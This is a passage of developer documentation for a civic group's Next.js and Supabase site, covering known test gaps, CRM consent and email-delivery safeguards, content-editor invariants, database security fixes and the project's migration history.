7. **The admin surfaces need their seeded sessions to have browser coverage.**
   `e2e/admin-authenticated.spec.ts` drives a real password sign-in into a stored
   session and `e2e/mfa-challenge.spec.ts` drives the step-up handshake, but both
   `test.skip` unless their credentials are set — and nothing sets them, because
   that needs two seeded users on the target Supabase project. The MFA suite needs
   **two** roles, and they are mutually exclusive: a non-MFA-enrolled admin (so
   `/admin` resolves at all) and an admin with one verified TOTP factor plus its
   `E2E_MFA_TOTP_SECRET` (so an AAL1 session can be bounced to `/auth/mfa`). The
   five secrets are declared in `scripts/ci-env.mjs` and registered in
   `scripts/secrets-registry.mjs`, so the audit sees them rather than finding five
   undeclared names. Until they exist, the CRM mutation path, the contact editor's
   optimistic-concurrency handshake and the AAL2 upgrade are unit-tested only —
   and a skipped suite must never be read as a passing one.
8. **Pre-existing CMS images still carry no `width` / `height`.** New and edited
    images are measured from their bytes at upload, and a hand-typed URL is
    measured client-side, so nothing added from here on shifts. The content
    migrated from Google Sites does not: those images sit on external hosts that
    are largely dead, so a backfill would rewrite every `content` row — and mint
    a revision per row — for what would mostly be no-op measurements. It is also
    a production data change, which belongs to the chapter rather than to a
    deploy. Cheaper when an author touches the page anyway.
9. **The edge `checkout` function is now rate-limited.** It shares the
    `search_rate_limit` rolling-window table with the search and WALL-E
    functions under a `checkout:` ip prefix, 10/min/IP — the same limit the
    Next route carries. `verify_jwt` still accepts the publishable key (public
    by construction), so the CORS `origin` restriction remains inert for a
    non-browser client; the table-backed window is the working control. Rows
    older than 7 days are purged nightly by pg_cron (migration
    20261008000000 — the edge functions insert and count but never delete).
10. **Consent is filterable, countable, saveable, and captured — but the reason is
    not recorded, and pre-existing rows are not backfilled.** `getCRMContacts` takes
    `consent: 'opted_out' | 'opted_in' | 'unasked'`, the dispatch bar names how many
    matching contacts were excluded rather than asserting that exclusion happens, and
    `crm_segments.consent` (migration 20261005000000) means the audit can be saved as
    a reusable segment. Migration `20261005020000` makes the column nullable and the
    contact form carries a second checkbox, so "never asked" is now a state the
    database can hold and a person who asked a question is no longer implicitly on
    the mailing list. The two numbers reconcile deliberately: `count + excludedCount`
    is every contact the audience rules matched, because both come from one target
    specification rather than two.

    Two things this deliberately did **not** do, and they are chapter decisions
    rather than deploys. **Why** somebody declined is still unrecorded — a volunteer
    answering "why did I stop hearing from you?" has nothing to read, and the answer
    lives only in an email thread. And **existing rows keep their `false`**, so a
    historical `false` still reads as `opted_in` when it may never have been an
    agreement at all; nothing here converts it into one. Until the chapter decides
    otherwise, use the `unasked` filter to find the genuinely unasked contacts and
    treat pre-migration `false` values as unknown-but-reachable. See
    `docs/crm-operations.md`.
11. **The next campaign reaches fewer people than the last one, and that is
    correct.** Migration `20261005020000` drops the `do_not_email` default, so every
    contact created by a path that does not ask — profile signup, store order, a CSV
    import with no consent column — is `NULL` ("never asked") and therefore excluded,
    where previously the column default opted them in. Enforcement was never the
    problem; capture was. A chapter-visible number changes on deploy, which is worth
    knowing before the first campaign goes out rather than after.
12. **`crm_sync_historical_records()` and the three `fn_sync_*_to_crm()` triggers
    were the only privileged functions not pinned to `search_path = ''`.** All three
    triggers fired on rows reachable from the public internet — the contact form's
    RPC is `SECURITY DEFINER` and granted to `anon`, and the trigger fires on
    its owner-privileged insert, with `RLS` bypassed and a `search_path` starting
    at `public`. (An earlier draft of this note named a `WITH CHECK (true)` INSERT
    policy for `anon`; that policy was dropped at 20260922050000 and never
    recreated. The conclusion — pin the path — was right; the stated mechanism
    was stale.) The pre-commit guard only checked that *a* `SET search_path` was
    present, and `= public` satisfies that; it now checks the value and the
    body's qualification. Fixed by migration 20261005010000, which re-declares
    the three. Note: `fn_sync_contact_submission_to_crm()` is declared in
    20261005020000 instead, because that version also writes `do_not_email`;
    leaving it in 20261005010000 would have produced a dead intermediate
    declaration on a partial apply.
13. **The merge RPC's arithmetic is plpgsql and only a text test covers it.**
    `merge_crm_contacts` is `SECURITY DEFINER`, `search_path = ''`,
    `service_role`-only, and locks both rows survivor-first. No row-based mock can
    execute it, so `merge-crm-contacts-migration.test.ts` reads the migration and
    asserts the properties — a guard against editing the SQL, which is the
    realistic regression. It does not execute it: `migration-dryrun.mjs` is
    `supabase db push --dry-run`, which diffs the migration history against the
    linked project and never applies a statement.
    So nothing in the repository runs `merge_crm_contacts`, and the first execution is
    the push itself. A test that reads SQL is not a test that runs it, and neither is
    a diff.
---

## Agent Skills

Skills are installed in `.agents/skills/` (symlinked for discovery at `.claude/skills/`).
The vendored ones are pinned in `skills-lock.json` — load on demand, do not load
all skills upfront, do not re-install manually.

`cms-editor-and-crm` is **not** vendored. It is written for this codebase, is not
in the lockfile, and is meant to be edited when an invariant changes.

Full usage guide with project-specific context for each skill: **[SKILLS.md](./SKILLS.md)**

Quick trigger table:

| Skill | Load when |
|---|---|
| `cms-editor-and-crm` | **Any change to the content editor, the CRM, `sanitize.ts`, or anything that can send email** |
| `vercel-react-best-practices` | Writing or refactoring any React / Next.js code |
| `vercel-composition-patterns` | Component API design, compound components, boolean-prop refactors |
| `web-design-guidelines` | UI or a11y audits |
| `vercel-react-view-transitions` | Page/route animations, shared element morphs |
| `deploy-to-vercel` | Deploying or creating preview deployments |
| `vercel-cli-with-tokens` | Vercel CLI in CI / token-based automation |
| `vercel-optimize` | Vercel cost or performance investigation |
| `writing-guidelines` | Docs or copy review |
| `vgpu` | WebGPU / shader work (`vgpu` package) |
| `vercel-react-native-skills` | Not applicable — web-only project |

Update: `bunx skills update` · Restore: `bunx skills experimental_install`

---

## The admin surfaces

Two admin surfaces own the material a volunteer actually edits. They have their
own docs, because their failure modes are invisible to review and to unit tests.

- **Two-factor authentication** — [`docs/mfa.md`](./docs/mfa.md). Enrolment,
  the step-up contract, and the five gates. Read it before changing
  `src/app/auth/mfa/`, `src/lib/mfa-guard.ts` or `MfaSettings.tsx`. Three things
  there are load-bearing and each has failed visibly:

  - **The challenge page answers TOTP only** and filters on `factor_type`. Picking
    the first verified factor of *any* type made a phone factor send an SMS and then
    reject the digits permanently, with no explanation.
  - **A guard failure has a `reason`, and only `step_up_required` earns a redirect.**
    Redirecting on every failure was a four-hop loop — a `listFactors` failure sent
    the user to a page that could not read its factors either, then to `/login`,
    then back to a gated route. `state_unknown` fails closed and is *shown* as a
    fault.
  - **Recovery is a second factor, not a code.** There are no backup codes; losing
    every authenticator is still an out-of-band dashboard reset, and the panel says
    so rather than implying otherwise.

  `/account` and `/auth/mfa` read **live** `listFactors()` rather than AAL alone,
  because AAL comes from the cookie snapshot and the two disagree after 2FA is
  unenrolled elsewhere — which produced an unanswerable challenge. A commit
  message on that gate named a cause that is unreachable on the installed SDK; the
  comment above the gate now states the real one.

- **Content editor** — [`docs/content-editor.md`](./docs/content-editor.md).
  Block model in `src/lib/blocks/`, shell in `ContentEditor.tsx`, server actions
  in `src/lib/actions/content.ts`. Three invariants matter most: autosave persists
  with the document's *current* publish state (an earlier version hardcoded
  `draft` and quietly unpublished live pages); image deletion checks
  `content.body`, `content.featured_image` **and** `content_revisions.body`
  before removing an object; a revision restore writes the revision's
  `featured_image` back instead of clearing the hero; and the history panel
  shows what a restore would change with an inline confirm, never a native
  dialog. Every destructive action on both surfaces goes through the shared
  `ConfirmAction` component — `window.confirm()` asks a blind question and
  cannot be automated, so the paths behind it went untested. A preview renders
  through the same sanitizer and classes as the public page, as a modal. A row
  action names the state it reaches: **View** only when a page is live, never a
  public-URL link for a draft, which resolves to a 200 "Page Not Found" that is
  indistinguishable from a typo. SEO
  meta fields (`meta_title` / `meta_description` in `content.metadata`) win
  over derived values in `generateMetadata`.

  **A save carries the version it was based on.** `saveContent` takes an optional
  `expectedUpdatedAt` and turns it into a precondition on the same UPDATE — two
  organizers on one page used to be last-write-wins with no signal, which is the
  default outcome of the one surface whose purpose is to look after written work.
  Three details are load-bearing and each fails silently without its own test:
  the precondition rides on the UPDATE rather than a SELECT-then-UPDATE (which
  would leave a window in which a colleague's save still lands); the returned
  version is the one the `BEFORE UPDATE` trigger wrote, not a JS timestamp (a
  second clock disagrees, and the author's next autosave conflicts with itself);
  and a null claim uses `.is()`, never `.eq()` (`.eq(col, null)` is
  `col=eq.null` and matches nothing, so the guard would fire against an untouched
  page). The editor keeps it in a ref and adopts it from each save's response,
  and a revision restore adopts the version it re-reads — but undo, redo and
  draft recovery deliberately do not, because they never write the row.
- **A status control has to reach the guard, and a snapshot has to match the
  write.** The Status `<select>` sat next to the Publish button and called
  `setStatus` — local state — for years. `status` is part of the document
  snapshot, so `dirty` flipped and the autosave effect published 2.5 seconds
  later: choosing "Draft" on a live page took it off the site with no
  confirmation and no toast. It could not reach the guarded path because that
  function was a no-argument *toggle*, and a toggle cannot express "the author
  picked Draft" — hence `handleSetStatus(next)`. Separately, `persist` snapshotted
  `fields`, whose `status` predates the write, so a successful publish left
  `dirty` true: the toast said "Published", the indicator contradicted it, and
  autosave rewrote the document 2.5s later, minting a second `content_revisions`
  row per publish. Both are pinned in `ContentEditor.safety.test.tsx`.
- **A rejected promise is not a failed result.** `saveContent` returning
  `{success:false}` was always reported. A *rejection* was not: `handleSave` set
  `saving = false` on the line after the `await`, which a rejection skips, and
  `saving` is what disables the Save button — so one dropped connection left the
  editor permanently unable to save itself, recoverable only by reloading, which
  discards the document. The autosave effect was `void persist().then()` with no
  `.catch()` at all, so it claimed "Saving…" for the rest of the session while
  writing nothing. Both now report, and the message names the three things a
  volunteer can act on: not saved, text still on screen, copy it before reloading.
- **CRM and broadcasting** — [`docs/crm-operations.md`](./docs/crm-operations.md).
  Delivery is off the request path: the action writes a `queued` row and the
  `crm-broadcast-send` Edge Function owns delivery and progress. A self-test
  derives its recipient from the session and **cannot be pointed** at anyone
  else; the narrowing lives in the Edge Function, where recipients are resolved.

  `crm_broadcasts.status` omits nothing, but it once omitted `'queued'` — the
  value the app writes and the sender requires — so **every broadcast failed at
  the insert** and no unit test noticed, because they mock the Supabase client.
  A `CHECK` constraint that disagrees with the code is a trap; when you add a
  state, update the constraint in the same change.

  **Two of its guards were broken, in the direction that looks like safety.**
  `isDeliverableAddress` used a POSIX character class, `[^@[:space:],]`, in a
  **JavaScript** regex. There is no such thing inside `[...]`: it is the literal
  run `[ : s p a c e :]`, so the negated set forbade the letters `s p a c e`
  alongside the separators. `alice@example.com` was rejected — the guard stopped a
  self-test reaching several recipients by refusing to reach *any*. And it lived
  only inside the Edge Function, which no test runner can reach, which is why the
  editor and the CRM are covered and the code deciding who receives email was not.
  It is now in `_shared` and unit-tested, and **anything a
  `crm-broadcast-send` guard must be right about belongs in `_shared` for the same
  reason.** A guard that fails closed on legitimate input is still broken, and one
  nobody can see reads as protection.

  **The audience is paged in a stable order.** Both resolvers called
  `.range(offset, …)` with no `.order()`. Offset paging is coherent only against a
  total order that does not change between statements, and PostgREST emits no
  `order` parameter when none is given — so a contact who opted out, or a CSV
  import that landed, between page 3 and page 4 shifts every later row by one. The
  boundary contact is then **mailed twice** and `recipient_count` is wrong; a
  concurrent insert silently skips someone instead. Both now order by `id`, the
  primary key, so the order is total — a non-unique column would still tie. The
  same file's `getCRMExistingTags` already did this, which is what made it an
  oversight rather than a decision.

  **The directory's filters go through one helper, and the consent filter used to
  be dropped by three of the four paths that build a URL.** `src/lib/crm-filters.ts`
  owns the filter→URL, filter→action-argument and segment→filter mappings. The
  quick pills, the saved-segment chips and **the CSV export** each omitted
  `consent`, so an organiser auditing opt-outs clicked a district and the whole
  opted-out population silently reappeared — and exporting from an "Opted Out of
  Email" view produced a file of *every* contact, which is both wrong and the one
  export a chapter takes off-platform. The export and "save as segment" also read
  uncommitted form state rather than the applied filters, so both could act on a
  set that was never on screen. Each omission is a wrong set of people with no
  error, which is why it is one function and a test per path.

  **Three unbounded reads, and one silently capped.** The contact 360 timeline had
  no `.limit()` at all, so a recipient of one 5,000-recipient broadcast had 5,000
  timeline entries on their profile; it is now capped at 50 with a true count and
  a line saying what is not shown. Campaign history and drafts were `.limit(50)`
  and `.limit(20)` with no pager, so a chapter past fifty campaigns could not see
  its fifty-first and a twenty-first draft was unreachable *and* unremovable. The
  composer's tag chips were `slice(0, 40)` with no indication, so a chapter with
  more than 40 tags had constituents who could not be targeted at all. The
  broadcast template carried the same class of bug as a hardcoded apex
  (`BROADCAST_SITE_URL`) in both copies — a staging build mailed links to a
  host that 302s to Google Sites until the cutover. The origin is now a
  parameter: the Next app passes `NEXT_PUBLIC_SITE_URL`, the sender passes
  `APP_URL`, and the parity test asserts neither copy hardcodes an origin.

  **Every wait in a send is now bounded, and two of them were not.** The dispatch
  fetch, the Resend call per recipient, and each progress poll had no timeout. A
  hung dispatch left the composer's button disabled forever with the row still
  `queued`; a hung Resend call stranded the row at `sending` with
  `dispatched_at` set — the one state that must never be re-dispatched; and a hung
  poll froze the progress loop, because its only exit is a `catch` that a hang never
  reaches. Bounds and reasoning: `docs/crm-operations.md`.

  **`markCRMBroadcastFailed` is one-directional on purpose.** The documented
  recovery for a stranded row was "send a new, narrower broadcast" and then mark
  the old one failed — correct, and previously only reachable by editing the
  database. The action can only move a row to `failed`, never back, and refuses a
  row dispatched in the last fifteen minutes, because cutting short a slow send is
  the one irreversible mistake available here.

  **A GET must never change state on the unsubscribe route.** It did: the
  `do_not_email` write sat *above* the method branch, so `GET` opted the contact
  out and only differed in what it rendered afterwards — while the route's own
  docblock said GET only rendered a confirmation. Corporate mail security products
  fetch every URL in an inbound message (Proofpoint, Barracuda, Microsoft Safe
  Links) and clients prefetch on hover, so any of them turns "the recipient
  clicked unsubscribe" into "the recipient's mail gateway clicked unsubscribe" —
  a silent mass opt-out across a 5,000-recipient list. GET now writes nothing and
  renders a form; POST performs the opt-out, told apart by the *body* (`confirm=1`
  from the browser, empty from an RFC 8058 auto-confirm) rather than by sniffing
  `Accept`, which would silently start returning an empty `204` to a real person
  if a mail client changed a header.

**No test may send email, by two different mechanisms.** The contact form's
notifier is *redirected* in e2e: `playwright.config.ts` points
`CONTACT_FUNCTION_URL` at a local mock, and `notifyUrl()` refuses to fall back
to the live URL in an e2e build, so the call is harmless rather than bypassed —
the suite still exercises the delivery-status UI and its failure branches. The
CRM send paths are *refused in code*: `sendCRMBroadcast`,
`sendCRMBroadcastSelfTest` and `sendCRMDirectEmail` return early when
`isE2EMode()` is true, because they dispatch to a live Edge Function that talks
to Resend and there is no redirect for them. That matters the moment e2e gains a
seeded admin session. Any new send path needs the second mechanism;

**The e2e flags must never reach a Vercel environment.** `isE2EMode()` requires
both `CONTACT_SUBMISSION_TEST_MODE` and `NEXT_E2E_BUILD`, and Playwright sets
both only on the server process it spawns. If either ever appears in a Vercel
env var, that deployment becomes a site where CRM sends silently fail and the
contact form posts to a mock — with no UI signal. The admin layout now renders
a loud amber banner whenever `isE2EMode()` is true, so an accidental e2e build
announces itself to the first admin who loads `/admin` rather than reading as
a broken CRM. The two vars themselves are never a "config knob" anyone should
flip on purpose; they are a property of the test harness.

  A preview stays in the campaign history — hiding it would leave a campaign with
  no visible trace — so every column has to say what happened. Its audience reads
  `Nobody — sent only to you`, never `All Constituents`, because a preview row has
  no filters at all, and rendering it the way a campaign renders tells an
  organizer a blast went out when nobody received anything.
`isE2EMode()` requires **both** `CONTACT_SUBMISSION_TEST_MODE` and
`NEXT_E2E_BUILD`, so CI cannot enable it by accident and an admin cannot
disable real delivery by setting one variable.

---

## Visual Editor Overlay & CRM Panel

### Visual Editor Overlay (`src/components/visual-edit/VisualEditOverlay.tsx`)

A full-featured in-page visual editor mounted globally in `src/app/layout.tsx`. Admins toggle it via the **Editorial Button** (icon-only `PenLine` in header, `EditorialDrawerRow` in mobile drawer).

**Capabilities:**
- **Direct in-place editing suite**: Click any text block or copy region to edit inline with floating formatting toolbar (Bold, Italic, Underline, Strikethrough, Inline Code, Highlight mark, Bullet/Numbered lists, Link/Unlink, Clear formatting, Heading 2/3 and Paragraph block format quick switchers, live word/character counters).
- **Direct S3 image replacement & 1-click device upload**: Click any `<img>` tag to summon the image asset pill, replacing assets via `CRMMediaLibraryModal`, directly uploading replacement files from desktop via `uploadCRMMedia`, or updating accessibility `alt` text with instant backend persistence.
- **Dynamic ResizeObserver tracking**: Uses a `ResizeObserver` on `[data-visual-edit-root]` debounced with `requestAnimationFrame` to keep section overlays and bounding boxes pixel-perfect during inline text expansion and dynamic DOM mutations.
- **Interactive controls protection**: Tabs, accordions, audio players, dialog triggers, and civic buttons (`[role="tab"]`, `[data-civic-control]`, `.audio-player`, etc.) are protected from `contentEditable` hijacking.
- **Responsive viewport simulator**: Interactive Desktop (100%), Tablet (768px), and Mobile (390px) framed preview modes directly in the editor sidebar.
- **CRM Visual Broadcast Composer enhancements**: Email canvas viewport simulation (100% full width, 600px email standard, 375px mobile phone) and real-time word count & reading time estimation stats in `VisualComposerCanvas.tsx`.
- **Per-section CRUD**: Every section has a floating action pill (frame on/off, edit, duplicate, move up/down, add below, delete with `ConfirmAction`)
- **Block editor modal**: Rich editing for all 11 block types (heading, paragraph, bulletList, orderedList, quote, callout, code, image, divider, table, button) with inline toolbar (bold, italic, code, strikethrough, link)
- **Unified editor sidebar** (`VisualEditorSidebar.tsx`): One fixed right panel with three context zones — default (toolbar), inline-edit (amber), image-edit (sky). It owns undo/redo (Cmd+Z/Shift+Z), save, badges/frames toggles, viewport simulator (desktop/tablet/mobile), theme toggle, section navigator, add block menu (Radix `DropdownMenu`, never hover-only), media library, revisions, settings, CRM Studio link; its collapsed state is a `w-12` icon strip persisted under `visual_edit_dock_collapsed`. Replaces the former bottom dock and the two floating rails; the old browser surfaces remain recoverable at `git show HEAD:src/components/visual-edit/VisualEditOverlay.tsx`.
- **Media library**: `CRMMediaLibraryModal` (reused from CRM composer) for Supabase Storage `media` bucket pick/upload
- **Revisions**: `getContentRevisions` / `restoreContentRevision` with `ConfirmAction`
- **Settings modal**: Edit title, slug, status (publish/draft), featured image
- **Backend health**: Probes DB, Storage, Edge Functions (`getCRMEdgeFunctionHealth`)
- **CRM Panel**: `CRMPanel` (see below)

**Invariants:**
- Header button is icon-only master switch; per-section controls live on section pills + drawer `EditorialDrawerRow`
- All modals follow the reader's palette (`bg-surface-card`, `text-foreground`, etc.); sidebar/pills/frames stay dark chrome (`bg-secondary`)
- Add Block menu is a Radix `DropdownMenu` (click-to-open, keyboard accessible), never hover-only
- Hidden frames recover via per-block frame switch in sidebar block bar

### CRM Panel in Visual Editor (`src/components/visual-edit/CRMPanel.tsx`)

A `Dialog` opened from the overlay sidebar (`Constituents` button, `UsersRound` icon). Reuses existing CRM actions and components.

**Capabilities:**
- **Search constituents**: `getCRMContacts({ query, consent, page, pageSize })`
- **Create/edit contact**: Reuses `CRMContactEditorModal` (optimistic concurrency via `expectedUpdatedAt`)
- **Delete contact**: `deleteCRMContact` behind `ConfirmAction`
- **Consent tri-state**: `setCRMEmailConsent` with `opted_in` / `opted_out` / `unasked`
- **Follow-ups**: Reuses `CRMTaskForm` via `addCRMTask` / `getCRMTasksForContact`
- **Notes** — `crm_activities` timeline (`getCRMContactDetail`), with add (`addCRMNote`), in-place edit (`updateCRMNote`) and `ConfirmAction` delete (`deleteCRMNote`). Existing `notes` column kept.
- **Task mutation** — `setCRMTaskStatus` toggle + edit (`updateCRMTask`) + `ConfirmAction` delete (`deleteCRMTask`)
- **Consent** — derived from `crm-filters.ts` (`ConsentFilter`, `consentLabel`, `splitActiveValues`); local `consentFromDoNotEmail` removed
- **Segments** — read-only chips + `/admin/crm/segments` link (using overlay `<a>` precedent); stray `{}` JSX artifact removed; `generateMetadata` fixed to use `pageMetadata`
- Tests: `src/components/visual-edit/__tests__/CRMPanel.test.tsx` scaffolded per `VisualEditOverlay.test.tsx` convention (`createRoot`, hoisted mocks, `ConfirmAction` stub)

**All mutations through existing server actions** (`src/lib/actions/crm.ts`). No email sending from overlay — send paths are E2E-refused and dispatch live Edge Functions.

### `content_media` Table (`supabase/migrations/20261011000000_content_media_hardening.sql`)

Tracks per-page media items for the visual editor.

- Columns: `id`, `content_id`, `name`, `path`, `url`, `mime_type`, `size`, `width`, `height`, `alt_text`, `caption`, `folder`, `sort_order`, `created_at`, `updated_at`
- RLS: Public read only for published parent content; Admin full manage
- Actions: `getContentMedia`, `createContentMediaRow`, `updateContentMediaRow`, `deleteContentMediaRow`, `uploadAndCreateContentMedia` (in `src/lib/actions/content-media.ts`)
- Types: `src/types/content-media.ts` (manual until migration lands + `bun run types:generate`)
- Tests: `src/lib/__tests__/content-media.test.ts` (19 tests, all on the shared
  row-based mock). It used to hand-roll a builder whose `maybeSingle()` answered
  a no-match read with an *error* — the inverse of PostgREST's
  `{ data: null, error: null }` — so `assertContentPublished`'s error-only guard
  passed every green test while drafts sailed through in production. The guard
  now also refuses `data === null`, and the suite is converted to
  `createMockAdminClient`.

---

## Migration Roadmap

All phases are complete. This section is kept for historical context.

<details>
<summary>Phase history</summary>

**Phase 1 — Core Infrastructure** ✅
Supabase schema, Next.js 16 project scaffold, Header/Footer.

**Phase 2 — Feature Parity** ✅
Home page hero, product catalog + detail pages, cart + Stripe checkout, Logbook (blog) with spam filtering.

**Phase 3 — Content & Assets** ✅
Static pages (FAQs, About, Partners, Gallery), partner logos, community gallery, Sledger Rigs, legal pages.

**Phase 4 — Production Hardening** ✅
README/AGENTS/CLAUDE docs, ProductCard + Gallery design hardening, end-to-end QA, Stripe live keys.

**Phase 5 — Stack Hardening** ✅
- Error telemetry: `error_reports` table (anon insert-only RLS) + rate-limited `/api/report-error` wired into `error.tsx` / `global-error.tsx`. Both boundaries now also file to Sentry (`indivisiblefairoaks-web` project) via `Sentry.captureException` — dual reporting, neither channel replaces the other; the SDK stays disabled wherever no DSN is set.
- Full-text search: weighted `tsvector` generated columns + GIN indexes + ranked RPCs (`search_products`, `search_content`); `/search` uses FTS with ILIKE fallback.
- A11y regression gate: `@axe-core/playwright` over 12 public routes; serious/critical violations fail CI. `/admin` is excluded — the auth-gated surfaces have no seeded session, so the editor and the CRM have no automated a11y coverage at all.
- Contrast remediation: `--primary-ink` token for lime-on-light text; lime-bg CTAs use dark text; raw lime reserved for dark non-text accents.
- Bundle hygiene: removed dead `mime-types`; React Query devtools dev-only gated.
- Cart crash fix: `env.ts` was spreading `process.env` (empty client stub → ZodError). Public vars now use dotted property access (inlined by bundler); spreads are server-only.
- Contact email delivery: `notify-contact` Edge Function invoked directly from the server action; atomic `email_sent_at` claim prevents duplicate sends; global 20/10-min volume cap resists anon floods; opt-in sender copy locked to the submitter's own address.
- Daily compatibility workflow: nightly CI with frozen install, lint/types/unit/build/e2e, live health probes, advisory AI diff review (never gates CI).
- RLS role-repair: `scripts/rls-role-repair.mjs` — the recreate-and-rebind playbook for orphaned policy→role OID references. It is a script rather than a migration because it responds to a re-provisioning event, not to a schema change.

</details>

<!-- BEGIN:nextjs-agent-rules -->

# This is NOT the Next.js you know

This version has breaking changes — APIs, conventions, and file structure may all differ from your training data. Read the relevant guide in `node_modules/next/dist/docs/` (resolved from this file's directory; in monorepos the `next` package may not be visible from the repo root) before writing any code. Heed deprecation notices.

This block is written and re-added by `next dev` — verify at `node_modules/next/dist/server/lib/generate-agent-files.js`. Removing it from a diff only re-creates the uncommitted change; committing it with your work keeps the tree clean.

<!-- END:nextjs-agent-rules -->
